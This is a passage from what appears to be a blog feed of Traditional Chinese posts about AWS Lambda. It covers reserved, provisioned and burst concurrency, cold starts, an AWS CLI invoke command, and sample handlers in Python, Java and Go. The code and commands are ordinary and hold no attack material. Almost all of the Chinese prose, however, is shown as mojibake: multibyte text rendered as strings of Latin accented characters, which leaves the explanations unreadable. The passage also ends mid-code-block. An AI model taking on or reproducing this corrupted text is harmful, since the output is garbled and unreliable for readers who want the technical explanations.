ç’°å¢ƒå­˜åœ¨ï¼Œå°æ–¼æ™‚é–“æ•æ„Ÿåº¦é«˜çš„è«‹æ±‚ï¼Œå°±æ¯”è¼ƒé©åˆè¨­å®šé€™å€‹åŠŸèƒ½ï¼Œæ‰ä¸ç”¨å†åº¦æ”¶åˆ°åˆå§‹åŒ–çš„å»¶é²å½±éŸ¿ã€‚</p><p><img src="https://hackmd.io/_uploads/rJ1GiHSJT.png"></p><p>é‚£è¦æ€éº¼è¨­å®š Provision Concurrency å‘¢ï¼Ÿ[2]</p><blockquote><p>æé†’ï¼šç‚ºå‡½æ•¸è¨­å®š Provision Concurrency æ˜¯è¦æ”¶è²»çš„</p></blockquote><h2 id="å¯¦é©—äºŒ-è¨­ç½®-Provision-Concurrency"><a href="#å¯¦é©—äºŒ-è¨­ç½®-Provision-Concurrency" class="headerlink" title="å¯¦é©—äºŒ - è¨­ç½® Provision Concurrency"></a>å¯¦é©—äºŒ - è¨­ç½® Provision Concurrency</h2><p>åœ¨è¨­å®š Provision Concurrencyä¹‹å‰æœ‰å€‹å‰ç½®ä½œæ¥­è¦åšï¼Œä¹Ÿå°±æ˜¯<strong>ç™¼å¸ƒä½ çš„å‡½æ•¸ç‰ˆæœ¬</strong>ã€‚</p><p>æ¯å€‹å‡½æ•¸åœ¨ç™¼å¸ƒç‰ˆæœ¬ä¹‹å‰çš„é è¨­éƒ½æ˜¯ï¼š <strong>$LATEST</strong>ï¼Œä½† Provision Concurrency ä¸¦ä¸èƒ½è¨­å®šåœ¨ $LATEST ç‰ˆæœ¬çš„å‡½æ•¸ä¸Šé¢ï¼Œé€™æ˜¯ä¸€å€‹é™åˆ¶ã€‚</p><p>å¯ä»¥å…ˆåœ¨ä¸»é ä¸­çš„ <strong>Version</strong> æ‰¾åˆ° <strong>Publish new version</strong><br><img src="https://hackmd.io/_uploads/H1khZIrya.png"></p><p>æ¥è‘—å¯ä»¥å¡«å…¥é€™å€‹ç‰ˆæœ¬çš„æ•˜è¿°ï¼Œç„¶å¾ŒæŒ‰ä¸‹ Publish<br><img src="https://hackmd.io/_uploads/By2C-UH1T.png"></p><p>ä¹‹å¾Œå°±æœƒèª¿è½‰åˆ° Version 1 çš„ Lambdaå‡½æ•¸ä¸»æ§å° ï¼ˆèˆ‡ $LATEST å‡½æ•¸ä¸»æ§å°ç•¥å¾®ä¸åŒï¼‰ã€‚é€™æ™‚æ‡‰è©²æœƒçœ‹åˆ° Provision Concurrency çš„è¨­å®šç•«é¢ï¼Œé»é¸å¾Œå°±å¯ä»¥ç‚º Version 1 çš„å‡½æ•¸è¨­å®šä¸¦è¡Œã€‚</p><p><img src="https://hackmd.io/_uploads/Bk4KM8r1T.png"></p><p>ä¸‹æ–¹å¯ä»¥å¡«å…¥ä½ æƒ³è¦ç¶­æŒ warm start ç‹€æ…‹çš„ Lambda ä¸¦è¡Œæ•¸é‡ã€‚<br>åº•ä¸‹å¯ä»¥æ³¨æ„åˆ° â€œ10 availableâ€ã€‚é€™å€‹æ•¸å­—æ˜¯å“ªä¾†çš„å‘¢ï¼Ÿ</p><p>å…¶å¯¦é€™å€‹æ•¸å­—å°±æ˜¯ä½ å‡½æ•¸çš„ <strong>Reserved Concurrency çš„æ•¸é‡</strong></p><p>å¯ä»¥å›åˆ° $LATEST ç‰ˆæœ¬çš„å‡½æ•¸ä¸»æ§å°ç•«é¢ã€‚</p><p><img src="https://hackmd.io/_uploads/SJMrmLSyp.png"></p><p>åº•ä¸‹å¯ä»¥çœ‹åˆ°æˆ‘å€‘è¨­å®šæ•¸é‡å°±æ˜¯ 10ã€‚<br><img src="https://hackmd.io/_uploads/B1OLmIBJp.png"></p><blockquote><p><strong>å› æ­¤æˆ‘å€‘å¯ä»¥è¨­å®šä½ˆå»ºä¸¦è¡Œçš„æ•¸é‡ï¼Œæ˜¯å–æ±ºæ–¼ä½ ç‚ºè©²å‡½æ•¸è¨­å®šçš„ä¿ç•™ä¸¦è¡Œæ•¸é‡</strong></p></blockquote><p>æˆ‘å€‘é€™è£¡å°‡ä½ˆå»ºä¸¦è¡Œæ•¸é‡è¨­å®šæˆ 5ã€‚</p><p><img src="https://hackmd.io/_uploads/SkPZV8S1T.png"></p><p>ä¹‹å¾Œæœƒéœ€è¦é»æ™‚é–“ä¾†å»ºç«‹ä¸¦è¡Œã€‚</p><p>æ¥è‘—æˆ‘å€‘ä¾†æ¸¬è©¦è¨­å®šçš„ Provision Concurrencyã€‚</p><p>é¦–å…ˆï¼Œä»¥ä¸‹æ˜¯æ¸¬è©¦ç”¨çš„ code (åœ¨version1 å‡½æ•¸ç•¶ä¸­çš„ç¨‹å¼ç¢¼)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json, time</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lambda_handler</span>(<span class="params">event, context</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sleep for 3 secs&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;statusCode&#x27;</span>: <span class="number">200</span>,</span><br><span class="line">        <span class="string">&#x27;body&#x27;</span>: json.dumps(<span class="string">&#x27;Hello from Lambda!&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘å€‘é€šé AWS CLI ä¾†å»è§¸ç™¼ Lambda å‡½æ•¸</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aws lambda invoke \</span><br><span class="line">--function-name TestInvocations \</span><br><span class="line">--cli-binary-format raw-in-base64-out \</span><br><span class="line">--qualifier 1 \</span><br><span class="line">--payload &#x27;&#123; &quot;key&quot;: &quot;value&quot; &#125;&#x27; </span><br><span class="line">response.json</span><br></pre></td></tr></table></figure><p>åœ¨ <code>--qualifier</code> åƒæ•¸å¾Œé¢æ¥çš„æ˜¯ç‰ˆæœ¬åç¨±æˆ–è€…æ˜¯ Alias åç¨±ã€‚</p><p>å¯ä»¥å…ˆæš«åœï¼Œåœ¨å¯¦éš›è§¸ç™¼éŒ¢å…ˆå»è§€å¯Ÿ CloudWatch ä¸Šçš„è§¸ç™¼æ—¥èªŒ</p><p><img src="https://hackmd.io/_uploads/ryTU7dBJ6.png"></p><p>æœƒç™¼ç¾æœ‰å¤šå€‹åŸ·è¡Œç’°å¢ƒå·²ç¶“å…ˆé ç†±å®Œæˆäº†</p><blockquote><p>è‡³æ–¼æ•¸é‡ç‚ºä½•å¤§æ–¼ Provision Concurrency æ•¸é‡é€™é»å°šæœªç¢ºå®š<br>å¯èƒ½æ˜¯ç‚ºäº†å¯ç”¨æ€§ï¼Ÿ</p></blockquote><p>åœ¨é–‹å¤šå€‹çµ‚ç«¯é€è«‹æ±‚å¾Œï¼Œå¯ä»¥ç™¼ç¾ä¸€æ¨£ï¼Œå› ç‚ºåŸ·è¡Œç’°å¢ƒå·²ç¶“é ç†±å¥½ï¼Œå› æ­¤ä¸éœ€è¦é‡æ–° Initï¼Œå¯ä»¥åŸºæ–¼ Container-Reuse çš„ç‰¹æ€§ä¾†åœ¨ç¾æœ‰çš„åŸ·è¡Œç’°å¢ƒåŸ·è¡Œè«‹æ±‚ã€‚</p><p><img src="https://hackmd.io/_uploads/rkdt4urya.png"></p><h2 id="Reserved-Concurrency-vs-Provison-Concurrency"><a href="#Reserved-Concurrency-vs-Provison-Concurrency" class="headerlink" title="Reserved Concurrency vs. Provison Concurrency"></a>Reserved Concurrency vs. Provison Concurrency</h2><p><img src="https://hackmd.io/_uploads/B1BXrdB1a.png"></p><blockquote><p>åœ–ç‰‡ä¾†æºï¼š <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-concurrency.html#reserved-and-provisioned">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-concurrency.html#reserved-and-provisioned</a></p></blockquote><p>ç”¨å®˜æ–¹å±•ç¤ºä¸€å¼µå°æ¯”åœ–ä¾†è§£é‡‹é€™å…©ç¨®ä¸¦è¡Œçš„å·®ç•°ã€‚</p><p>ä»¥ä¸‹æ˜¯æˆ‘æ•´ç†é€™å…©ç¨®ä¸¦è¡Œçš„å·®ç•°</p><table><thead><tr><th></th><th>RC(Reserved Concurrency)</th><th>PC(Provision Concurrency)</th></tr></thead><tbody><tr><td>è²»ç”¨:</td><td>ä¸ç”¨æ”¶è²»</td><td>è¦æ”¶è²»</td></tr><tr><td>ç‰¹æ€§ï¼š</td><td>ç¢ºä¿ä¸€å®šæ•¸é‡çš„LambdaåŸ·è¡Œç’°å¢ƒå­˜åœ¨</td><td>ç¢ºä¿ä¸€å®šæ•¸é‡çš„LambdaåŸ·è¡Œç’°å¢ƒå­˜åœ¨ä¸”é€™ç•¶ä¸­æœ‰ä¸€å®šæ•¸é‡çš„åŸ·è¡Œç’°å¢ƒå·²ç¶“åˆå§‹åŒ–éäº†</td></tr><tr><td>é”åˆ°limitçš„åæ‡‰</td><td>Throtteld <code>TooManyRequest</code></td><td>è‹¥é‚„æœ‰RCé¡åº¦ï¼Œå‰‡æœƒæ“´å¢åŸ·è¡Œç’°å¢ƒå€‹æ•¸ï¼Œä½†ä¸€æ¨£æœƒæœ‰å†·å•Ÿå‹•ï¼Œæ²’æœ‰é¡åº¦å‰‡ Throttled</td></tr></tbody></table><blockquote><p>ä¹Ÿè«‹åƒè€ƒå®˜æ–¹çš„å·®ç•°è¡¨æ ¼ [3]</p></blockquote><h2 id="æš´å¢ä¸¦è¡Œ"><a href="#æš´å¢ä¸¦è¡Œ" class="headerlink" title="æš´å¢ä¸¦è¡Œ"></a>æš´å¢ä¸¦è¡Œ</h2><p>æ‰€è¬‚çš„æš´å¢ä¸¦è¡Œï¼ˆBurst Concurrencyï¼‰ï¼Œç›®çš„ä¹Ÿæ˜¯ç‚ºäº†èƒ½å¤ æ‡‰ä»˜çªç„¶æš´å¢çš„è«‹æ±‚ã€‚</p><p>ä½†é¢å°çªç„¶å¢åŠ çš„å¤§é‡è«‹æ±‚ï¼ŒLambda å¯èƒ½ä¹Ÿæ²’è¾¦æ³•ç«‹å³æ“´å±•ä¾†è™•ç†ï¼Œé€™æ˜¯ç‚ºäº†é˜²æ­¢ Lambda å‡½æ•¸éåº¦æ“´å±•æ¶ˆè€—å¤ªå¤šè³‡æºã€‚</p><p>æ‰€ä»¥åœ¨å› æ‡‰å‡½æ•¸æš´å¢çš„é€Ÿåº¦ï¼Œå¯ä»¥é€šéè¨­å®šæš´å¢ä¸¦è¡Œä¾†å»å¢åŠ å»ºç«‹ Lambda åŸ·è¡Œç’°å¢ƒçš„æœ€é«˜é€Ÿåº¦ã€‚è€Œé€™å€‹è¨­å®šæ˜¯ Account-Level çš„è¨­å®šã€‚</p><p>ä½†åœ¨ä¸åŒ Regionï¼Œæš´å¢ä¸¦è¡Œæœ‰ä¸Šé™çš„å·®ç•°ï¼š</p><ul><li><code>us-west-2</code>, <code>us-east-1</code> ä»¥åŠ <code>eu-west-1</code>çš„ Region åŸºæœ¬ä¸Šæ˜¯ä¸Šé™éƒ½æ˜¯ 3000</li><li><code>ap-northeast-1</code>, <code>eu-central-1</code> é‚„æœ‰ <code>us-east-2</code> Region ä¸Šé™æ˜¯ 1000</li><li>å…¶ä»– Region éƒ½æ˜¯ 500</li></ul><p>ä»¥ us-east-1 ç‚ºä¾‹ï¼Œæš´å¢ä¸¦è¡Œæ¯åˆ†é˜æ“´å±• 500 å€‹å–®ä½çš„æš´å¢æ“´å±•ï¼ˆé¡å¤–çš„ Lambda åŸ·è¡Œç’°å¢ƒï¼‰ï¼Œç›´åˆ°é”åˆ°éœ€æ±‚æˆ–è€…æ˜¯é”åˆ°ä¸Šé™ 3000å€‹ã€‚</p><p>è¶…å‡ºä¸Šé™çš„è«‹æ±‚æœƒè¢« Throttled (Status Code: 429)</p><p>æœ‰èˆˆè¶£çš„å¯ä»¥ç›´æ¥çœ‹å®˜æ–¹æ–‡ä»¶é‡å°æš´å¢ä¸¦è¡Œçš„ä»‹ç´¹ [5]ã€‚</p><h2 id="å†·å•Ÿå‹•-ï¼ˆCold-Startï¼‰"><a href="#å†·å•Ÿå‹•-ï¼ˆCold-Startï¼‰" class="headerlink" title="å†·å•Ÿå‹• ï¼ˆCold Startï¼‰"></a>å†·å•Ÿå‹• ï¼ˆCold Startï¼‰</h2><blockquote><p>Lambda åœ¨ Init éšæ®µåšäº†å“ªäº›äº‹æƒ…</p></blockquote><ul><li>ç•¶ Lambda æœå‹™é€é Lambda API æ”¶åˆ°å•Ÿå‹• Lambda å‡½æ•¸çš„è«‹æ±‚æ™‚æœå‹™æœ¬èº«æœƒå»ä¸‹è¼‰å‡½æ•¸ç¨‹å¼ç¢¼ã€‚</li><li>é€™å€‹ç¨‹å¼ç¢¼æœƒå­˜æ”¾åœ¨ Lambda å…§éƒ¨çš„ S3 bucketç•¶ä¸­</li><li>å¦‚æœæ˜¯ç”¨å‡½æ•¸æ˜¯ç”¨å®¹å™¨å»ºç«‹ï¼Œå‰‡å‡½æ•¸ç¨‹å¼ç¢¼æœƒæ”¾åœ¨ <strong>Amazon ECR</strong> ä¸Š</li><li>æ¥è‘—æœƒå»å»ºç«‹å…·æœ‰æŒ‡å®šè¨˜æ†¶é«”å¤§å°ä»¥åŠæŒ‡å®š Runtime çš„ç’°å¢ƒ </li><li>æ¥è‘—æœƒå»åŸ·è¡Œ å‡½æ•¸ Handerä¹‹å¤–çš„åˆå§‹åŒ–ç¨‹å¼</li></ul><p>æ ¹æ“š [4]ï¼Œå¯ä»¥çŸ¥é“ä¸Šé¢çš„æ­¥é©Ÿé™¤äº†åŸ·è¡Œå‡½æ•¸åˆå§‹åŒ–ç¨‹å¼å¤–ï¼Œéƒ½å±¬æ–¼ Cold Start çš„ç¯„åœã€‚è€ŒåŸ·è¡Œå‡½æ•¸ handler å¤–çš„ç¨‹å¼ç¢¼å°±ç®—æ˜¯ warm startï¼Œä¹Ÿå°±æ˜¯æˆ‘å€‘å¯ä»¥æ§åˆ¶çš„ç¯„åœäº†ã€‚</p><blockquote><p>å‡½æ•¸åˆæ˜¯æ€éº¼èƒ½å¤ ä¸€ç›´ä¿æŒæ˜¯ â€œwarmâ€çš„ï¼Ÿ</p></blockquote><p>å®˜æ–¹æ–‡ä»¶èªªæ˜æ˜¯é€šéä¸€ç¨® <strong>pinging mechanism</strong>ã€‚ä¸»è¦å¯¦è¸æ–¹å¼æ˜¯é€éè¨­å®š <strong>Eventbridge</strong> çš„è¦å‰‡å®‰æ’æ¯åˆ†é˜èª¿ç”¨ä¸€æ¬¡å‡½æ•¸ä¾†å¹«åŠ©å‡½æ•¸åŸ·è¡Œç’°å¢ƒä¿æŒæ´»èºï¼Œ</p><p>æ¸›ç·©å†·å•Ÿå‹•çš„æ–¹å¼ï¼Œç›®å‰æ¨è–¦çš„é‚„æ˜¯è—‰ç”±è¨­å®š Provision Concurrencyã€‚<br>å¦å¤–é‚„æœ‰ <strong>Snapstart</strong>ï¼Œé€™å€‹æˆ‘å€‘å¯ä»¥ç•™åˆ°å¾Œé¢ç¹¼çºŒä»‹ç´¹ï½</p><h2 id="åƒè€ƒæ–‡ä»¶"><a href="#åƒè€ƒæ–‡ä»¶" class="headerlink" title="åƒè€ƒæ–‡ä»¶"></a>åƒè€ƒæ–‡ä»¶</h2><p>[1] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/configuration-concurrency.html#estimating-reserved-concurrency">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/configuration-concurrency.html#estimating-reserved-concurrency</a><br>[2] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/provisioned-concurrency.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/provisioned-concurrency.html</a><br>[3] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-concurrency.html#comparing-reserved-provisioned">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-concurrency.html#comparing-reserved-provisioned</a><br>[4] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/operatorguide/execution-environments.html#cold-start-latency">https://docs.aws.amazon.com/zh_tw/lambda/latest/operatorguide/execution-environments.html#cold-start-latency</a><br>[5]<a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/burst-concurrency.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/burst-concurrency.html</a></p>]]></content>
      
      
      <categories>
          
          <category> å¯¦ä½œç´€éŒ„ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> Lambda </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lambda åŸºæœ¬èªè­˜ feat.å®¹å™¨é‡ç”¨å°å¯¦é©—</title>
      <link href="/posts/c79cef2b.html"/>
      <url>/posts/c79cef2b.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>é¦–å…ˆï¼Œç‚ºä»€éº¼è«‡åˆ°ç„¡ä¼ºæœå™¨ç¸½æ˜¯æœƒæœ‰äººæåˆ° Lambda ?</p><p>ä»¥ä¸‹å°±é–‹å§‹ä¾†ä»‹ç´¹é€™å€‹æœå‹™</p><h2 id="FaaS-Function-as-a-Service"><a href="#FaaS-Function-as-a-Service" class="headerlink" title="FaaS (Function as a Service)"></a>FaaS (Function as a Service)</h2><p>ä¸€æ—¦è«‡åˆ°ç„¡ä¼ºæœå™¨é‹ç®—ï¼Œå°±æœƒæåˆ°ä»–çš„æ ¸å¿ƒæ¦‚å¿µï¼Œ<strong>åŠŸèƒ½å³æœå‹™(Function as a Service)</strong> ï¼Œé€™è£¡å¼•ç”¨ç¶­åŸºç™¾ç§‘å°æ–¼ FaaS çš„è§£é‡‹</p><blockquote><p>FaaS æ˜¯é›²ç«¯é‹ç®—çš„ä¸€ç¨®æ¨¡å‹ã€‚ä»¥å¹³å°å³æœå‹™ï¼ˆPaaSï¼‰ç‚ºåŸºç¤ï¼Œç„¡ä¼ºæœå™¨é‹ç®—æä¾›ä¸€å€‹å¾®å‹çš„æ¶æ§‹ï¼Œçµ‚ç«¯å®¢æˆ¶ä¸éœ€è¦éƒ¨ç½²ã€é…ç½®æˆ–ç®¡ç†ä¼ºæœå™¨æœå‹™ï¼Œç¨‹å¼ç¢¼é‹è¡Œæ‰€éœ€è¦çš„ä¼ºæœå™¨æœå‹™çš†ç”±é›²ç«¯å¹³å°ä¾†æä¾›ã€‚</p></blockquote><p>æ²’éŒ¯ï¼Œé€™å€‹æ¦‚å¿µçš„æ ¸å¿ƒå°±æ˜¯è®“ä½¿ç”¨è€…å°ˆæ³¨åœ¨è¨­è¨ˆç”¢å“æˆ–æ¥­å‹™é‚è¼¯ï¼Œè€Œä¸éœ€è²»å¿ƒåœ¨éƒ¨ç½²é…ç½®æˆ–æ˜¯è¨­å®šä¼ºæœå™¨ã€‚</p><p>è€Œæœ€æ—©å¯¦è¸é€™å€‹æ¦‚å¿µä¸¦æ¨å‡ºæœå‹™çš„ï¼Œå°±æ˜¯ AWS åœ¨ 2014 å¹´æ¨å‡ºçš„ Lambda æœå‹™ã€‚ï¼ˆç•¶ç„¶å¾ŒçºŒä¹Ÿæœ‰ Microsoft çš„ Azure Functionï¼‰</p><h2 id="Lambda-å‡½æ•¸"><a href="#Lambda-å‡½æ•¸" class="headerlink" title="Lambda å‡½æ•¸"></a>Lambda å‡½æ•¸</h2><blockquote><p>Lambda åœ¨é«˜å¯ç”¨æ€§çš„é‹ç®—åŸºç¤è¨­æ–½ä¸ŠåŸ·è¡Œæ‚¨çš„ç¨‹å¼ç¢¼ï¼Œä¸¦åŸ·è¡Œæ‰€æœ‰é‹ç®—è³‡æºçš„ç®¡ç†ï¼ŒåŒ…æ‹¬ä¼ºæœå™¨èˆ‡ä½œæ¥­ç³»çµ±ç¶­è­·ã€å®¹é‡ä½ˆå»ºèˆ‡è‡ªå‹•æ“´å±•ä»¥åŠè¨˜éŒ„ã€‚ä½¿ç”¨ Lambdaï¼Œæ‚¨å”¯ä¸€éœ€è¦åšçš„å°±æ˜¯åœ¨ Lambda æ”¯æ´çš„å…¶ä¸­ä¸€ç¨®èªè¨€åŸ·è¡ŒæœŸä¸­æä¾›æ‚¨çš„ç¨‹å¼ç¢¼ [1]ã€‚[name&#x3D;AWS Documents] </p></blockquote><p>ä»¥è¡Œç‚ºä¸Šä¾†çœ‹åŸºæœ¬ä¸Šå°±æ˜¯ï¼Œæˆ‘åº•ä¸‹çš„é€™å¼µåœ–ã€‚æœƒæœ‰æŸå€‹ä¸Šæ¸¸çš„è§¸ç™¼å™¨ï¼ˆTriggerï¼‰ï¼Œé€šå¸¸æ˜¯æŸç¨®æœå‹™ä¾†å»èª¿ç”¨ Lambda å‡½æ•¸ï¼Œæˆ–è€…æ˜¯æ‰‹å‹•é€éAWS CLI çš„æ–¹å¼èª¿ç”¨ã€‚ Lambda åŸ·è¡Œå‡½æ•¸å®Œç•¢å¾Œå°‡åŸ·è¡Œçµæœå›å‚³çµ¦åŸæœå‹™ï¼Œä¸¦ä¸”å¯ä»¥å°‡è§¸ç™¼ä¸‹æ¸¸çš„ç›®çš„åœ°ï¼ˆ Destinationï¼‰é€™é€šå¸¸ä¹Ÿæ˜¯æŸå€‹æœå‹™ã€‚</p><p><img src="https://hackmd.io/_uploads/SyPe6nOC2.png"></p><p>ç¾åœ¨å‡è¨­ä½ æ˜¯ä¸€å€‹æ–°æ‰‹ï¼Œå‰›æ¥è§¸ Lambda ä½ å¯èƒ½æœƒæ€¥è‘—æƒ³è¦æ‰“é–‹ä½ çš„ Console ï¼Œç”¨ç¯„ä¾‹ç¨‹å¼ï¼Œæˆ–è€…æœ‰äº›äººç¯„ä¾‹ç¨‹å¼å¯«ä»€éº¼éƒ½ä¸çœ‹å°±åˆªæ‰ï¼Œç›´æ¥è¤‡è£½è²¼ä¸Šæœ¬åœ°ç¨‹å¼ï¼Œç„¶å¾Œé€éé è¨­çš„ Event ä¾†å»æ¸¬è©¦ä½ çš„ Lambda å‡½æ•¸ï¼Œç„¶å¾Œç™¼ç¾è·‘ä¸å‹•â€¦.</p><p>è«‹åˆ¥æ€¥ï¼Œåœ¨å‹•æ‰‹å‰æœ€å¥½å…ˆæœ‰ Lambda Runtime ä»¥åŠ Lambda ç¨‹å¼çš„æ¦‚å¿µã€‚</p><h2 id="åŸºæœ¬è¦æ ¼"><a href="#åŸºæœ¬è¦æ ¼" class="headerlink" title="åŸºæœ¬è¦æ ¼"></a>åŸºæœ¬è¦æ ¼</h2><ul><li>RAM</li><li>Storage</li></ul><h3 id="è¨­ç½®-RAM"><a href="#è¨­ç½®-RAM" class="headerlink" title="è¨­ç½® - RAM"></a>è¨­ç½® - RAM</h3><p>RAM èˆ‡ CPU è™•ç†æ•ˆèƒ½æˆæ­£æ¯”ï¼Œå¯ä»¥é€éæå‡ RAM ä¾†é€£å¸¶æå‡CPUè™•ç†é€Ÿåº¦<br>    128MB to 3008MB</p><blockquote><p>åƒè€ƒä¾†æº:<br><a href="https://koding.work/aws-lambda-performance-is-related-to-memory-size/">https://koding.work/aws-lambda-performance-is-related-to-memory-size/</a></p></blockquote><h2 id="Lambda-Runtimes"><a href="#Lambda-Runtimes" class="headerlink" title="Lambda Runtimes"></a>Lambda Runtimes</h2><p>Lambda é€šéä½¿ç”¨ Runtime ä¾†æ”¯æ´å¤šç¨®ç¨‹å¼èªè¨€é–‹ç™¼ã€‚æ¯å€‹ä¸»è¦çš„ç¨‹å¼è¨­è¨ˆèªè¨€ç‰ˆæœ¬éƒ½æœ‰ç¨ç«‹çš„ Runtimesã€‚ è€Œé€™äº› Runtime æä¾›äº†åŸºæœ¬çš„ç¨‹å¼èªè¨€çš„å‡½å¼åº«ä»¥åŠåŸ·è¡Œç’°å¢ƒã€‚</p><p>ä¸»æµèªè¨€éƒ½æœ‰å®˜æ–¹æ”¯æ´çš„ Runtime åƒæ˜¯ NodeJS, Python, Java, Go, Ruby ç­‰ç­‰ï¼Œä¸¦ä¸”ä¹Ÿæ”¯æ´ä½ å»è‡ªå®šç¾© Runtimeã€‚<a href="https://github.com/awslabs/aws-lambda-cpp">åƒæ˜¯ C++ Runtime</a>ï¼Œå®˜æ–¹ä¹Ÿæœ‰æä¾› Github å’Œ Post å»å¯«æ€éº¼ä½¿ç”¨é€™ç¨®è‡ªå®šç¾©çš„ Runtimes [3]</p><blockquote><p>å°å¼Ÿå°±æœ‰è‡ªå®šç¾©é Perl Runtimeï¼Œä½†æœƒéœ€è¦è‡ªå¯« images..:(</p></blockquote><p>å¦å¤–ï¼Œ Lambda Runtime å…¶å¯¦éƒ½æ˜¯åŸºæ–¼ Amazon Linux é€²è¡Œé–‹ç™¼çš„ã€‚æ‰€ä»¥åŸºæœ¬ä¸Šå¦‚æœæœ‰è‡ªå®šç¾© Runtime çš„éœ€æ±‚ï¼Œå»ºè­°éƒ½æ˜¯é–‹å€‹ t2.micro çš„ EC2 (é¸æ“‡ Amazon Linux ç›¸é—œçš„ AMI )å†ä¾†å»å»ºæ§‹ Runtimeã€‚ </p><h2 id="Lambda-ç¨‹å¼è¨­è¨ˆæ¨¡å‹"><a href="#Lambda-ç¨‹å¼è¨­è¨ˆæ¨¡å‹" class="headerlink" title="Lambda ç¨‹å¼è¨­è¨ˆæ¨¡å‹"></a>Lambda ç¨‹å¼è¨­è¨ˆæ¨¡å‹</h2><p>Lambda æä¾›çš„ç¨‹å¼è¨­è¨ˆæ¨¡å‹å°æ–¼æ‰€æœ‰ Runtime é€šç”¨ã€‚ç¨‹å¼è¨­è¨ˆæ¨¡å‹æœƒå®šç¾©ä¸€å€‹ Handler ä¾†å»è™•ç†é€²ä¾†çš„äº‹ä»¶ã€‚é€™å€‹åšæ³•å…¶å¯¦å°±æ˜¯å°‡å‡½æ•¸çš„é€²å…¥é»å‘ŠçŸ¥ Lambdaã€‚åŸ·è¡Œæ™‚é–“æœƒå°‡åŒ…å«å‘¼å«äº‹ä»¶å’Œå…§å®¹çš„ç‰©ä»¶å‚³å…¥è‡³ Handlerï¼Œä¾‹å¦‚å‡½æ•¸åç¨±å’Œ Request IDã€‚</p><p>å¦‚æœä½ å»ºç«‹ä¸åŒ Runtime çš„ Functionï¼Œæ‡‰è©²æœƒåœ¨ä¸»æ§å°çš„ç¨‹å¼ç¢¼å€å¡Šä¸Šçœ‹åˆ°ä¸åŒèªè¨€ Handlerã€‚</p><p>Handler (Python)[4]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def handler_name(event, context): </span><br><span class="line">    ...</span><br><span class="line">    return some_value</span><br></pre></td></tr></table></figure><p>Handler (Java17)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">package example;</span><br><span class="line"></span><br><span class="line">import com.amazonaws.services.lambda.runtime.Context;</span><br><span class="line">import com.amazonaws.services.lambda.runtime.LambdaLogger;</span><br><span class="line">import com.amazonaws.services.lambda.runtime.RequestHandler;</span><br><span class="line"></span><br><span class="line">// Handler value: example.HandlerInteger</span><br><span class="line">public class HandlerIntegerJava17 implements RequestHandler&lt;IntegerRecord, Integer&gt;&#123;</span><br><span class="line"></span><br><span class="line">  @Override</span><br><span class="line">  /*</span><br><span class="line">   * Takes in an InputRecord, which contains two integers and a String.</span><br><span class="line">   * Logs the String, then returns the sum of the two Integers.</span><br><span class="line">   */</span><br><span class="line">  public Integer handleRequest(IntegerRecord event, Context context)</span><br><span class="line">  &#123;</span><br><span class="line">    LambdaLogger logger = context.getLogger();</span><br><span class="line">    logger.log(&quot;String found: &quot; + event.message());</span><br><span class="line">    return event.x() + event.y();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">record IntegerRecord(int x, int y, String message) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Handler (Go)    </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    package main</span><br><span class="line"></span><br><span class="line">import 